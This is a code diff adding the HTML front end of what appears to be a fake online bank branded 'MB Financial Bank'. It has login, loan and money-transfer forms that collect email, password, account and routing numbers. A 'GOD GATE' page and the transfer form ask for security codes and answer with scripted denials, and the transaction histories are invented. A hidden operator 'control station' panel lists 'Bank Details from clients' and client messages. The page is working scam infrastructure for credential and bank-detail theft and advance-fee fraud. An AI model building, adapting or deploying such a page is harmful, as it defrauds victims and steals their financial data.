+                    <span class="qtcAddy">Address: </span>
+                    <span>3030 E 92nd St, Chicago</span>
+                  </div>
+                </div>
+                <div class="col s6 m3 getInTouchBX">
+                  <i class="material-icons">phone</i>
+                  <div>
+                    <span class="qtcAddy">Phone: </span>
+                    <span>+1 312-948-1071</span>
+                  </div>
+                </div>
+                <div class="col s6 m3 getInTouchBX">
+                  <i class="material-icons">email</i>
+                  <div>
+                    <span class="qtcAddy">Email: </span>
+                    <span>info@mbfbanking.com</span>
+                  </div>
+                </div>
+                <div class="col s6 m3 getInTouchBX">
+                  <i class="material-icons">public</i>
+                  <div>
+                    <span class="qtcAddy">Website: </span>
+                    <span>mbfbanking.com</span>
+                  </div>
+                </div>
+              </div>
+              <!-- FORM -->
+              <div class="form_input">
+                <div class="row">
+                  <form class="col s12">
+                    <div class="row">
+                      <div class="input-field col s6">
+                        <i class="material-icons prefix">account_circle</i>
+                        <input id="full_name_report" type="text" class="validate">
+                        <span class="alsfuError fnError red-text"></span>
+                        <label for="full_name_report">Full Name</label>
+                      </div>
+                      <div class="input-field col s6">
+                        <i class="material-icons prefix">mail</i>
+                        <input id="email_report" type="tel" class="validate">
+                        <span class="alsfuError eError red-text"></span>
+                        <label for="email_report">Email</label>
+                      </div>
+                      <!-- TEXT AREA -->
+                      <div class="row">
+                        <div class="input-field col s12">
+                          <i class="material-icons prefix">mode_edit</i>
+                          <textarea id="message_report" class="materialize-textarea"></textarea>
+                          <span class="alsfuError msgError red-text"></span>
+                          <label for="message_report">Message</label>
+                        </div>
+                      </div>
+
+                      <div class="error_bx erbx1">
+                        <span class="error_txt red-text">
+                          
+                        </span>
+                      </div>
+                      <!-- SEND REPORT BUTTON -->
+                      <div class="send_report_bxx">
+                        <a class="btn" id="send_report_btn" onclick="sendReport();">Send</a>
+                        <i class="ldr_report hide fa fa-spinner fa-spin"></i>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+
+              <div class="rprts_loader hide">
+                <div class="preloader-wrapper big active">
+                  <div class="spinner-layer spinner-blue-only">
+                    <div class="circle-clipper left">
+                      <div class="circle"></div>
+                    </div><div class="gap-patch">
+                      <div class="circle"></div>
+                    </div><div class="circle-clipper right">
+                      <div class="circle"></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- INFO ALERTER -->
+          <div class="info_alerter_bx hide">
+            <div class="info_loader hide">
+              <div class="preloader-wrapper big active">
+                <div class="spinner-layer spinner-blue-only">
+                  <div class="circle-clipper left">
+                    <div class="circle"></div>
+                  </div><div class="gap-patch">
+                    <div class="circle"></div>
+                  </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- REPORT SUCCESS -->
+            <div class="report_success_bxx rsbxx hide">
+              <i class="material-icons green-text">assignment_turned_in</i>
+              <div class="commentBX"> 
+                <p>
+                  Your report has been successfully submitted. A customer representative will be with you shortly. 
+                  If you have any other questions or inquiries, you can use our live customer care feature to connect with an agent.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </DIV>
+
+    <div class="distract hide">
+      <div class="loader_ui hide">
+        <div class="preloader-wrapper big active">
+          <div class="spinner-layer spinner-blue-only">
+            <div class="circle-clipper left">
+              <div class="circle"></div>
+            </div><div class="gap-patch">
+              <div class="circle"></div>
+            </div><div class="circle-clipper right">
+              <div class="circle"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="row transfer-ui">
+        <div class="col s12 m6">
+          <div class="card ">
+            <div class="card-content white-text">
+              <div class="container">
+                <span>
+                  <div class="preloader-wrapper big active">
+                    <div class="spinner-layer spinner-blue-only">
+                      <div class="circle-clipper left">
+                        <div class="circle"></div>
+                      </div><div class="gap-patch">
+                        <div class="circle"></div>
+                      </div><div class="circle-clipper right">
+                        <div class="circle"></div>
+                      </div>
+                    </div>
+                  </div>
+                </span> 
+                <span class="transfer-info-txt"></span>
+                
+              </div>
+              <br><br><br><br>
+            </div>
+            <div class="card-action hide">
+              <a href="#">This is a link</a>
+              <a href="#">Cancel</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="col s12 m6 completed-transfer hide">
+          <div class="card ">
+            <div class="card-content white-text">
+              <div class="container">
+                <span>
+                  <div class="preloader-wrapper big active">
+                    <div class="spinner-layer spinner-blue-only">
+                      <div class="circle-clipper left">
+                        <div class="circle"></div>
+                      </div><div class="gap-patch">
+                        <div class="circle"></div>
+                      </div><div class="circle-clipper right">
+                        <div class="circle"></div>
+                      </div>
+                    </div>
+                  </div>
+                </span> 
+                <span class="transfer-info-txt">Your transfer is complete. Thank You For Banking With Us.</span>
+              </div>
+
+            </div>
+            <div class="card-action hide">
+              <a href="#">Dashboard</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- LOGIN BX -->
+    <div id="nb-login" class="">
+      <div class="desciber">
+        <h3 class="flow-text">
+          <a href="https://mbfbanking.com/">MB FINANCIAL BANK</a>
+        </h3>
+        <h6 class="blue-text">Sign in</h6>
+      </div>
+      <div class="login-bx">
+        <div class="row">
+            <form class="col s12" onclick="hideError();">
+              <div class="row">
+                <div class="input-field col s12">
+                  <input id="acc_email" type="email" class="validate" onclick="hideError();">
+                  <label for="acc_email">Email</label>
+                </div>
+              </div>
+              <div class="row">
+                <div class="input-field col s8">
+                  <input id="acc_password" type="password" class="validate" required onclick="hideError();">
+                  <label for="acc_password">Password</label>
+                </div>
+              </div>
+              <div class="row">
+                <p class="login-error red-text"></p>
+                <button type="button" id="login-btn" class="waves-effect waves-light btn center-align" onclick="LOGIN_USER();">
+                  <a class="white-text">Sign In</a>
+                </button>
+                <div style="text-align: center;" id="login_loader_bx">
+                  <i class="fa fa-spinner fa-pulse"></i>
+                </div>
+               
+                
+              </div>
+              <div class="row" id="login-policy">
+                <blockquote> <p></p> </blockquote>
+                <p>Uses two factor authentication</p>
+              </div>
+            </form>
+            <div class="progress">
+                <div class="indeterminate"></div>
+            </div>
+          </div>
+      </div>
+    </div>
+    <!-- END OF LOGIN BX -->
+
+      <!-- LOAN  --> 
+    <div class="loan-bx ie5 private">
+      <div class="progress">
+        <div class="indeterminate"></div>
+      </div>
+      <i class="material-icons close-loan" onclick="goHome()">close</i>
+      
+      <div class="row step-1 steps">
+        <h3 class="flow-text">Available Loan Offers</h3>
+        <div class="col s12 m4"> 
+          <div class="card" id="loan-1" onclick="loanAI('10000');">
+            <div class="card-content black-text">
+              <p class="flow-text"> 100.00 - 10,000.00 </p>
+            </div>
+            <span class="card-ui"></span>
+          </div>
+        </div>
+        <div class="col s12 m4"> 
+          <div class="card" id="loan-2" onclick="loanAI('30000');">
+            <div class="card-content black-text">
+              <p class="flow-text"> 10,000.00 - 30,000.00 </p>
+            </div>
+            <span class="card-ui"></span>
+          </div>
+        </div>
+        <div class="col s12 m4"> 
+          <div class="card" id="loan-3" onclick="loanAI('60000');">
+            <div class="card-content black-text">
+              <p class="flow-text"> 30,000.00 - 60,000.00 </p>
+            </div>
+            <span class="card-ui"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="row step-2 steps">
+        <h3 class="flow-text">Where do you want us to deposit the loan?</h3>
+        <div class="col s6"> 
+          <div class="card" id="loan-4"  onclick="loanAI('0');">
+            <div class="card-content black-text">
+              <p class="flow-text"> Use this account </p>
+            </div>
+            <span class="cu"></span>
+          </div>
+        </div>
+        <div class="col s6"> 
+          <div class="card" id="loan-5"  onclick="loanAI('1');">
+            <div class="card-content black-text">
+              <p class="flow-text"> Use a different account  </p>
+            </div>
+            <span class="cu"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="row step-3 steps" >
+        <h3 class="flow-text">In order to receive funds, provide these details</h3>
+        <form class="col s12">
+          <div class="row">
+            <div class="input-field col s12">
+              <i class="material-icons prefix">account_circle</i>
+              <input id="loan_bank_name" type="text" class="validate" placeholder="Bank name" required>
+              <label for="loan_bank_name">Bank name</label>
+            </div>
+            
+            <div class="input-field col s12">
+              <i class="material-icons prefix">place</i>
+              <input id="loan_bank_address" type="text" class="validate">
+              <label for="loan_bank_address">Bank address</label>
+            </div>
+            <div class="input-field col s12">
+              <i class="material-icons prefix">person_pin</i>
+              <input id="loan_receiver_name" type="text" class="validate">
+              <label for="loan_receiver_name">Receiver name</label>
+            </div>
+            <div class="input-field col s12">
+              <i class="material-icons prefix">business_center</i>
+              <input id="loan_account_number" type="number" class="validate">
+              <label for="loan_account_number">Account number</label>
+            </div>
+            <div class="input-field col s12">
+              <i class="material-icons prefix">compare_arrows</i>
+              <input id="loan_routing_number" type="number" class="validate">
+              <label for="loan_routing_number">Routing number</label>
+            </div>
+            <div class="input-field col s6 input-hidden">
+              <i class="material-icons prefix">euro_symbol</i>
+              <input id="loan_amount" type="text" class="validate" disabled>
+              <label for="loan_amount"></label>
+            </div>
+          </div>
+          <p class="loan-error  errors red-text">Denied</p>
+          <div class="row">  <button class="btn loan-btn">Continue</button> </div>
+        </form>
+      </div>
+    </div>
+    <!-- ENDOF LOAN  --> 
+    <div class="loader white private">
+      <div class="outer loader">
+        <div class="middle">
+          <div class="inner">
+            <div class="preloader-wrapper small active">
+              <div class="spinner-layer spinner-green-only">
+                <div class="circle-clipper left">
+                  <div class="circle"></div>
+                </div><div class="gap-patch">
+                  <div class="circle"></div>
+                </div><div class="circle-clipper right">
+                  <div class="circle"></div>
+                </div>
+              </div>
+            </div>
+            <p class="flow-text"></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!--extension-->
+    <!-- CONTACT THE BANK-->
+    <div class="menu_sections contact_section menu_contact_section row light-blue lighten-2">
+      <h3 class="white-text">Contact us</h3>
+      <div class="contact-bx s12">
+        <div class="col s12 l5 teal lighten-2 cu-bx" id="cu-bx-1">
+          <ul class="container cs">
+            <li> 
+              <i class="material-icons prefix">room</i> 
+              <span class="cs_txt">  3030 E 92nd St, Chicago </span>
+            </li>
+            <li style="display: hide;"> 
+              <i class="material-icons">phone</i> 
+              <span class="cs_txt"> +794-632-6610 </span>
+            </li>
+            <li> 
+              <i class="material-icons">mail</i> 
+              <span class="cs_txt"> contact@mbfbanking.com </span>
+            </li>
+          </ul>
+
+          
+        </div>
+        <div class="col s12 l7 white cu-bx">
+          <form class="container">
+            <div class="row ie1">
+              <div class="input-field col s12">
+                <i class="material-icons prefix">account_circle</i>
+                <input id="icon_prefix" type="text" class="validate name_of_sender">
+                <label for="icon_prefix">Name</label>
+              </div>
+              <div class="input-field col s12">
+                <i class="material-icons prefix">mail</i>
+                <input id="icon_telephone" type="tel" class="validate email_of_sender">
+                <label for="icon_telephone">Email</label>
+              </div>
+              <div class="input-field col s12">
+                <i class="material-icons prefix">mode_edit</i>
+                <textarea id="icon_prefix2" class="materialize-textarea message_of_sender"></textarea>
+                <label for="icon_prefix2">Message</label>
+                <span class="error-txt red-text">Inputs fields cannot be left blank</span>
+              </div>
+            </div>
+            <div class="cu-btn-bx">
+              <button class="btn cu-btn" type="button">Send</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <!-- ENDOF CONTACT THE BANK-->
+
+    <!-- SEND A TRANSFER -->
+    <div class="menu_sections contact_section menu_send_section row blue-grey darken-1">
+      <div class="coders bodyman hide">
+        <div class="search centerman">
+          
+          <br>
+          <div class="row s1">
+              <div class="input-field col s11">
+                <i class="material-icons prefix q">lock</i>
+                <input type="text" id="key_code" class="white-text">
+                <label for="key_code">Enter Key Code</label>
+              </div>
+              <div class="search-bx">
+                  <a onclick="securityKey();" class="btn" id="key-code-btn">Send</a>
+              </div>
+          </div>
+          <br>
+          <div class="row s2 hide">
+            <div class="input-field col s11">
+              <i class="material-icons prefix q">user</i>
+              <input type="text" id="pin_code" class="white-text">
+              <label for="pin_code">Enter Pin</label>
+            </div>
+            <div class="search-bx black-text">
+                <a class="btn black" id="key-code-btn" onclick="securityKey();">Continue</a>
+            </div>
+            <div class="progress hide">
+              <div class="indeterminate"></div>
+          </div>
+        </div>
+      </div>
+
+      </div>
+      <h3 class="white-text">Send money</h3>
+
+      <div class="card ie2">
+        <div class="card-content white-text">
+          <div class="row">
+            <form class="col s12 transfer-form" onclick="HIDE_ERROR('fromTransfer');">
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix black-text">call_to_action</i>
+                  <input type="text" id="transfer_bank_name" class="BTP_name autocomplete nob clear" required>
+                  <label for="transfer_bank_name">Bank name</label>
+                </div>
+
+                <div class="input-field col s12">
+                  <i class="material-icons prefix black-text">domain</i>
+                  <input id="bank_address" type="text" class="BTP_addressOfBank autocomplete validate clear" required>
+                  <label for="bank_address">Bank address</label>
+                </div>
+
+                <div class="input-field col s12">
+                  <i class="material-icons prefix black-text">account_circle</i>
+                  <input id="transfer_receiver_name" type="text" class="BTP_nameOfReceiver validate rn clear" required>
+                  <label for="transfer_receiver_name">Receiver's name</label>
+                </div>
+
+                <div class="input-field col s12">
+                  <i class="material-icons prefix black-text">confirmation_number</i>
+                  <input id="transfer_account_number" type="text" class="BTP_accountNumber validate an clear" required>
+                  <label for="transfer_account_number">Account number</label>
+                </div>
+
+                <div class="input-field col s12">
+                  <i class="material-icons prefix black-text">confirmation_number</i>
+                  <input id="transfer_routing_number" type="text" class="BTP_routingNumber validate clear" required>
+                  <label for="transfer_routing_number">Routing number</label>
+                </div>
+
+                <div class="input-field col s6">
+                  <i class="material-icons prefix black-text">attach_money</i>
+                  <input id="transfer_amount" type="text" class="BTP_transferAmount validate tamount clear" required>
+                  <label for="transfer_amount">Amount</label>
+                </div>
+                <div class="input-field col s6">
+                  <i class="material-icons prefix black-text">code</i>
+                  <input id="code-number" type="text" class="BTP_transferCode validate clear" required>
+                  <label for="code-number">Code</label>
+                </div>
+                <p class="transfer-error red-text">Your transfer has been denied. Please try again with valid inputs.</p>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div class="card-action">
+          <a  class="btn green transfer-btn" onclick="MAKE_A_TRANSFER()"> Continue </a>
+          <a class="btn red" onclick="goHome()">Cancel</a>
+        </div>
+      </div>
+      <div class="progress">
+        <div class="indeterminate"></div>
+      </div>
+    </div>
+    <!-- ENDOFSEND A TRANSFER -->
+
+    <!-- GOD GATE -->
+    <div class="menu_sections contact_section menu_pay_section row black">
+
+      <div class="row">
+        <div class="container">
+          <form class="col s12">
+            <div class="row">
+              <div class="input-field col s12 ie3">
+                <i class="material-icons prefix">account_circle</i>
+                <input id="icon_prefix" type="text" class="validate white-text code_input">
+                <label for="icon_prefix">Security code</label>
+                <p class="code-error red-text">Your access has been denied. Please try again with a valid code.</p>
+              </div>
+            </div>
+            <div class="row ie4">
+              <button class="btn" type="submit">Access Service</button>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!--LOADER UI-->
+    <div class="progress">
+      <div class="indeterminate"></div>
+    </div>
+    
+    </div>
+    <!-- ENDOF GOD GATE -->
+
+    
+    <div class="" id="XXBTMCONTROL">
+      <div class="btm-holder">
+        <span>
+          <div class="btm-pointer-ctnr menu_activity menu_links" onclick="openActivity();">
+            <i class="material-icons">assignment</i>
+            <h6>activity</h6>
+          </div>
+        </span>
+        <span>
+          <div class="btm-pointer-ctnr menu_contact menu_links" onclick="openContact();">
+            <i class="material-icons">phone</i>
+            <h6>contact</h6>
+          </div>
+        </span>
+        <span>
+          <div class="btm-pointer-ctnr menu_home menu_links" onclick="openHome();">
+            <i class="material-icons">public</i>
+            <h6>home</h6>
+          </div>
+        </span>
+        <span>
+          <div class="btm-pointer-ctnr menu_send menu_links" onclick="openSend();">
+            <i class="material-icons">arrow_forward</i>
+            <h6>send</h6>
+          </div>
+        </span>
+        <span>
+          <div class="btm-pointer-ctnr menu_pay menu_links wq" onclick="LOGOUT_USER();">
+            <i class="material-icons">exit_to_app</i>
+            <h6>Logout</h6>
+          </div>
+          <div class="btm-pointer-ctnr menu_pay menu_links billx" onclick="openPay();">
+            <i class="material-icons">assignment</i>
+            <h6>pay <span class="rq">bills</span> </h6>
+          </div>
+        </span>
+      </div>
+
+      <div class="logout-bxx">
+        <a  class="btn blue logout" onclick="LOGOUT_USER();">LOGOUT</a>
+      </div>
+    </div>
+    <!--endof extension-->
+
+        <!-- SECRET SERVICE PORTAL CONTROL STATION-->
+        <DIV class="portal black private">
+          <div class="row">
+            <div class="col s12 m6">
+                  <div class="card grey darken-4">
+                    <div class="card-content white-text">
+                      <span class="card-title">Recent transfers</span>
+                      <ul id="transfer-list" class="nb-list">
+                      </ul>
+                    </div>
+                    <div class="card-action">
+                      <a>Get transfers</a>
+                      <a href="#">This is a link</a>
+                    </div>
+                  </div>
+            </div>
+            <div class="col s12 m6">
+              <div class="card grey darken-4">
+                <div class="card-content white-text">
+                  <span class="card-title">Messages from clients</span>
+                  <ul id="messages-list" class="nb-list">
+                  </ul>
+                </div>
+                <div class="card-action">
+                  <a></a>Read Messages</a>
+                  <a href="#">This is a link</a>
+                </div>
+              </div>
+            </div>
+            <div class="col s12 m6">
+              <div class="card grey darken-4">
+                <div class="card-content white-text">
+                  <span class="card-title">Bank Details from clients</span>
+                  <ul id="loan-list" class="nb-list">
+                  </ul>
+                </div>
+                <div class="card-action">
+                  <a>Read Loan Data</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </DIV>
+        <!-- ENDOF SECRET SERVICE PORTAL CONTROL STATION-->
+
+
+        <div class="BANK_ACCOUNT account-bx account-01-new hide">
+          <div class="menu_sections home-sec menu_home_section">
+            <div class="account-header row white">
+                <div class="btn ah-btn">
+                  <span class="logout" onclick="LOGOUT_USER();">LOGOUT</span>
+                </div>
+              <div class="col l4 s6 ah-1">
+                <span class="ah-1-welcome color-0">Welcome</span>
+                
+                <h3 class="flow-text accountName">
+                  
+                  <div class="progress">
+                    <div class="indeterminate"></div>
+                  </div>
+                </h3>
+                <p> <small class="red-text lock_txt" id="acc-lock"></small> </p>
+                <p> <small class="accountAddress"></small> </p>
+              </div>
+              <div class="col l3 s6  ah-1">
+                <span class="ah-1-welcome color-0">Balance</span>
+                <h3 class="flow-text accountBalance"></h3>
+                <p> <small></small> </p>
+              </div>
+              
+            </div>
+    
+            <div class="row home_sec_r1 ">
+              <div class="col s12 l6">
+                <div class="recent_transaction card" style="max-height: 472px;">
+                  <h3 class="flow-text">RECENT TRANSACTIONS</h3>
+                  <ul class="collapsible .acc-transfer-col act">
+
+                    <li class="hide">
+                      <div class="collapsible-header ch">
+                        <i class="material-icons  red-text">arrow_back</i>
+                        Family Supermarket - Groceries
+                        <span class="amount">-R640.56</span> 
+                        <span class="time grey-text">1 June 2022</span> 
+                      </div>
+                      <div class="collapsible-body grey-text">
+                        <span>You have successfully transferred 400.00 via balance.</span>
+                      </div>
+                  </li>
+
+                
+
+            </ul>
+                </div>
+              </div>  
+              <div class="col s12 l6 white">
+                <div class="recent_transaction features card">
+                  <h3 class="flow-text">FEATURES</h3>
+    
+                  <div class="row fr">
+                    <a class="waves-effect  btn" onclick="openApplyLoan();"><i class="material-icons right">attach_money</i>Request for loan</a>
+                    <a class="waves-effect  btn" onclick="openSend();"><i class="material-icons right">flash_on</i>Instant transfer</a>
+                    <a class="waves-effect  btn" onclick="openPay();"><i class="material-icons right">insert_chart</i>Build A Budget</a>
+                    <a class="waves-effect  btn" onclick="openPay()"><i class="material-icons right">local_atm</i>Find A Free ATM</a>
+                  </div>
+                </div>
+                <div class="recent_transaction features card">
+    
+                  <div class="container">
+                    <ul>
+                      <li><a >Notification <span class="new badge">0</span></a></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+    
+          </div>
+          <div class="menu_sections menu_activity_section" id="menu_sec_2">
+            <div class="cnt hide">
+              <table class="">
+                <thead>
+                  <tr>
+                      <th>YEAR</th>
+                      <th> </th>
+                      <th>2022</th>
+                  </tr>
+                </thead>
+        
+                <tbody>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>RocoMamas Greenpoint</td>
+                    <td>-R3037.46</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Immediate Payment Fee</td>
+                    <td>-R7.50</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Ms D.S Lindbergh</td>
+                    <td>-R35 000.00</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Caltex</td>
+                    <td>-R900.00</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Checkers Sea Point</td>
+                    <td>-R1045.99</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Immediate Payment Fee</td>
+                    <td>-R7.50</td>
+                  </tr>
+                  <tr>
+                    <td>2 June 2022</td>
+                    <td>Bullish Beast</td>
+                    <td>-R60 000.00</td>
+                  </tr>                
+                </tbody>
+              </table>
+            </div>
+            <div class="activity_card">
+              <ul class="collapsible">
+                  <li class="active">
+                    <div class="collapsible-header"><i class="material-icons">access_time</i>YEAR (2023)</div>
+                    <div class="collapsible-body activity_section">
+                      <ul>
+                        <li>
+                          <div class="row transaction_history">
+                            <div class="col s1">
+                              <i class="material-icons">check</i>
+                            </div>
+                            <div class="col s8">
+                              <span class="flow-text">
+                                Direct Deposit 
+                              </span>
+                              <span class="grey-text">
+                                Your account has been credited with an amount of $350,320.00
+                              </span>
+                              <span class="grey-text">
+                                01 March 2021, 02:04 PM
+                              </span>
+                            </div>
+                            <div class="col s2">
+                              <span class="flow-text">350,320.00</span>
+                            </div>
+                          </div>
+                        </li>
+                      </ul>
+                    </div>
+                  </li>
+              </ul>
+            </div>
+    
+          </div>
+        </div>
+        
+
+   
+
+
+
+            <script>
+                $("#nb-login form").submit(function(e){
+                      e.preventDefault();
+                    });
+            </script>
+            <script src="js/materialize.js"></script>
+            <script src="js/master.js"></script>
+            
+
+            <!-- <script src="dbb.js"></script> -->
+            <script src="dbbb.js"></script>
+            <script src="middleman.js"></script>
+            <script src="browser.js"></script>
+
+            <!-- TRANSFER SECTION I/O -->
+            <script src="transfer_section_io.js"></script>
+            
+            <!--Start of Tawk.to Script-->
+            <script type="text/javascript">
+              var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+              (function(){
+              var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+              s1.async=true;
+              s1.src='https://embed.tawk.to/643b416431ebfa0fe7f888c3/1gu3nesh3';
+              s1.charset='UTF-8';
+              s1.setAttribute('crossorigin','*');
+              s0.parentNode.insertBefore(s1,s0);
+              })();
+            </script>
+              <!--End of Tawk.to Script-->
+            
+    
+  </body>
+</html>
+
+
+  <!-- Start of Tawk.to Script
+  <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    // s1.src='https://embed.tawk.to/628fc841b0d10b6f3e743949/1g40qcg5j'; snitch own
+      s1.async=true;
+      s1.src='https://embed.tawk.to/63458efb37898912e96e11ee/1gf3rd27k';
+      s1.charset='UTF-8';
+      s1.setAttribute('crossorigin','*');
+      s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script> -->
+    <!--End of Tawk.to Script--> 
+    
